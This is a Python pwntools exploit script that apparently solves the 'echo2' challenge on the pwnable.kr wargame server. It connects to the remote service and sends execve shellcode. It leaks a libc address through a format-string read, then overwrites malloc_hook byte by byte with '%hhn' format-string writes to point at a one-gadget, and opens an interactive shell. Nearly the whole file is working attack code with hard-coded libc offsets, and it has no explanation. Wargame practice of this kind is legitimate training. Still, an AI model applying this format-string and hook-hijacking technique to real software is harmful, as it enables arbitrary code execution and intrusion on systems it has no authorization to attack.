#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

# imports

from pwn import *
import time

context.log_level = "debug"
context.arch="amd64"

#p = process("./echo2", env = {"LD_PRELOAD":"/home/afang/way2pwnnie/PwnableKr/ROokiss/echo2/libcer"})
p = remote("pwnable.kr", 9011)
#p = process("./echo2")
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

shellcode_2 = asm("mov rax,0x3b;mov rdi,0x6020a0;mov rsi,0;syscall")
offset = "a" * 8

print p.recvuntil(" : ")
p.sendline("sh")
print p.recvuntil("> ")
time.sleep(0.3)
p.sendline("3")
print p.recv()
time.sleep(0.3)
p.sendline(offset + shellcode_2)
time.sleep(0.3)
print p.recvuntil("> ")
p.sendline("2")
print p.recv()
#leak heap payload:

payload_leak = "%7$s" + "a" * 4 + p64(0x602018)
p.sendline(payload_leak) #fmtstr atk.
time.sleep(0.5)
data = p.recv()
libc = u64(data[:6].ljust(8,"\x00"))
target = libc - 0x20740
print "target:"
print hex(target)
malloc_hook = target + 0x3c3b10
one = target + 0xef9f4

p.sendline("2")
time.sleep(0.5)
print p.recv()
raw_input("here.")

print hex(one)
print hex(malloc_hook)
part1 = int(str(hex(one))[-2:],16)
part2 = int(str(hex(one))[-4:-2],16)
part3 = int(str(hex(one))[-6:-4],16)
part4 = int(str(hex(one))[-8:-6],16)
part5 = int(str(hex(one))[-10:-8],16)
part6 = int(str(hex(one))[-12:-10],16)

target_1 = malloc_hook
target_2 = malloc_hook + 0x1 
target_3 = malloc_hook + 0x2
target_4 = malloc_hook + 0x3
target_5 = malloc_hook + 0x4
target_6 = malloc_hook + 0x5
payload1 = "%{}c%8$hhn".format(part1).ljust(0x10,"a") + p64(target_1)
payload2 = "%{}c%8$hhn".format(part2).ljust(0x10,"a") + p64(target_2)
payload3 = "%{}c%8$hhn".format(part3).ljust(0x10,"a") + p64(target_3)
payload4 = "%{}c%8$hhn".format(part4).ljust(0x10,"a") + p64(target_4)
payload5 = "%{}c%8$hhn".format(part5).ljust(0x10,"a") + p64(target_5)
payload6 = "%{}c%8$hhn".format(part6).ljust(0x10,"a") + p64(target_6)

p.sendline(payload1)
print p.recv()
p.sendline("2")
print p.recv()
p.sendline(payload2)
print p.recv()
p.sendline("2")
print p.recv()
p.sendline(payload3)
print p.recv()
p.sendline("2")
print p.recv()
p.sendline(payload4)
print p.recv()
p.sendline("2")
print p.recv()
p.sendline(payload5)
print p.recv()
p.sendline("2")
print p.recv()
p.sendline(payload6)
print p.recv()
p.sendline("2")
print p.recv()
raw_input('now')
p.interactive()





